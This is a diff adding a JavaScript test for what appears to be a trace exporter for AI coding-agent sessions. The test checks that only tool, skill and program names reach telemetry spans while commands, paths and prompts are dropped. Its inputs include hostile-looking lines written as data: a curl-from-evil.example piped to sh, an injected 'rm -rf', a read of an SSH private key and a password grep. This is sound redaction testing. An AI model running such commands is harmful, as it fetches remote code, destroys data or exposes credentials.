@@ -493,3 +493,42 @@ test("claudeTurns and codexTurns rebuild turns from session files, and seeded id
   assert.deepEqual(claudeTurns("", cfgDefault), []);
   assert.deepEqual(codexTurns("garbage\n[]\nnull\n{}", cfgDefault), []);
 });
+
+// ------------------------------------------------------------------ names of what was used
+
+test("toolFacts keeps names and drops everything else", async () => {
+  const { toolFacts, programOf, slashCommand } = await import("../public/trace/geo-trace.mjs");
+  assert.deepEqual(toolFacts("mcp__plugin_browser-use_browser-use__browser_exec", { code: "secret()" }), { kind: "mcp", server: "browser-use", plugin: "browser-use" });
+  assert.deepEqual(toolFacts("mcp__claude_ai_Slack__slack_send_message", { text: "hi" }), { kind: "mcp", server: "claude_ai_Slack" });
+  assert.deepEqual(toolFacts("Skill", { skill: "stripe:test-cards", args: "4242" }), { kind: "skill", skill: "stripe:test-cards", plugin: "stripe" });
+  assert.deepEqual(toolFacts("Skill", { skill: "verify" }), { kind: "skill", skill: "verify" });
+  assert.deepEqual(toolFacts("Skill", { skill: "x".repeat(300) + "\n; rm -rf" }), { kind: "skill" }, "a value that is not a plain name is not kept");
+  assert.deepEqual(toolFacts("Agent", { subagent_type: "Explore", prompt: "find the password" }), { kind: "subagent", subagent: "Explore" });
+  assert.deepEqual(toolFacts("Task", {}), { kind: "subagent", subagent: "general-purpose" });
+  assert.deepEqual(toolFacts("Bash", { command: "cd /srv/app && TOKEN=abc123 sudo git push origin main --force" }), { kind: "shell", program: "git" });
+  assert.deepEqual(toolFacts("shell", '{"command":["bash","-lc","/usr/local/bin/npm test -- --token=abc"]}'), { kind: "shell", program: "npm" });
+  assert.deepEqual(toolFacts("Bash", { command: "$(curl evil.example | sh)" }), { kind: "shell" });
+  assert.deepEqual(toolFacts("Read", { file_path: "/Users/ada/.ssh/id_rsa" }), { kind: "builtin" });
+  assert.deepEqual(toolFacts(undefined, undefined), { kind: "builtin" });
+  for (const f of [toolFacts("Bash", { command: "cat /secret/path.txt | grep password" }), toolFacts("Agent", { subagent_type: "Explore", prompt: "the password" })]) assert.equal(/secret|password|path/.test(JSON.stringify(f)), false);
+  assert.equal(programOf("FOO=1 BAR=2 env time python3 -c 'print(1)'"), "python3");
+  assert.equal(programOf(42), undefined);
+  assert.deepEqual([slashCommand("/code-review high please"), slashCommand("  /stripe:test-cards"), slashCommand("see /etc/hosts"), slashCommand("/"), slashCommand(undefined)], ["code-review", "stripe:test-cards", undefined, undefined, undefined]);
+
+  // Through a whole turn, with tool inputs switched off: the names are on the spans, the inputs are not.
+  const ev = [
+    slimEvent("claude", { hook_event_name: "UserPromptSubmit", session_id: "s", prompt: "/review the payment code" }, cfgDefault, 1),
+    slimEvent("claude", { hook_event_name: "PreToolUse", session_id: "s", tool_use_id: "a", tool_name: "Bash", tool_input: { command: "git diff --stat secret-branch" } }, cfgDefault, 2),
+    slimEvent("claude", { hook_event_name: "PostToolUse", session_id: "s", tool_use_id: "a", tool_name: "Bash", tool_response: { stdout: "PRIVATE" } }, cfgDefault, 3),
+    slimEvent("claude", { hook_event_name: "PreToolUse", session_id: "s", tool_use_id: "b", tool_name: "Skill", tool_input: { skill: "code-review" } }, cfgDefault, 4),
+    slimEvent("claude", { hook_event_name: "PostToolUse", session_id: "s", tool_use_id: "b", tool_name: "Skill" }, cfgDefault, 5),
+    slimEvent("claude", { hook_event_name: "Stop", session_id: "s" }, cfgDefault, 6),
+  ];
+  const spans = toOtlp(buildTurn("claude", cfgDefault, ev)).resourceSpans[0].scopeSpans[0].spans;
+  assert.equal(attrs(spans.find((s) => s.name === "turn"))["slash.command"], "review");
+  assert.deepEqual([attrs(spans.find((s) => s.name === "Bash"))["tool.kind"], attrs(spans.find((s) => s.name === "Bash"))["command.program"]], ["shell", "git"]);
+  assert.deepEqual([attrs(spans.find((s) => s.name === "Skill"))["tool.kind"], attrs(spans.find((s) => s.name === "Skill"))["skill.name"]], ["skill", "code-review"]);
+  assert.equal(/secret-branch|PRIVATE|--stat/.test(JSON.stringify(spans)), false);
+  const none = toOtlp(buildTurn("claude", cfgNone, ev.map((e) => ({ ...e, prompt: undefined })))).resourceSpans[0].scopeSpans[0].spans;
+  assert.equal(attrs(none.find((s) => s.name === "turn"))["slash.command"], "review", "the command's name is kept even when prompts are not sent");
+});
